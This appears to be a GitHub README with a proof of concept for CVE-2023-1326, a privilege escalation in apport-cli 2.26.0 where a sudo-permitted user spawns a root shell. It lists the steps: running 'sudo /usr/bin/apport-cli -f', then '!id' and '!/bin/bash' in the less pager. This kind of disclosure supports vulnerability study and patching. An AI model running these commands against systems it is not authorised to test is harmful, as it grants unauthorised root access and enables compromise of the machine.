# CVE-2023-1326

A proof of concept for CVE-2023–1326 in apport-cli 2.26.0

This vulnerability is privilege escalation in apport-cli 2.26.0, similar to CVE-2023–26604, this vulnerability only works if assign in sudoers:

![image](https://github.com/c0d3cr4f73r/CVE-2023-1326/assets/66146701/f052d0f2-6f35-4510-8a7c-b2133fa3c6b2)

A privilege escalation attack was found in apport-cli 2.26.0 and earlier which is similar to CVE-2023-26604. If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege.

```
sudo /usr/bin/apport-cli -f
```

![image](https://github.com/c0d3cr4f73r/CVE-2023-1326/assets/66146701/ce8fe682-3be4-4420-87e0-ad1b75126af3)

![image](https://github.com/c0d3cr4f73r/CVE-2023-1326/assets/66146701/db6f803e-b8d7-43b9-93ed-21dc648f08df)

![image](https://github.com/c0d3cr4f73r/CVE-2023-1326/assets/66146701/3dbbc88f-b3f8-4650-8fe3-1050f123bed6)

```
!id
!/bin/bash
```
![image](https://github.com/c0d3cr4f73r/CVE-2023-1326/assets/66146701/efed11c2-af7b-4866-9ccf-bb561da6018d)



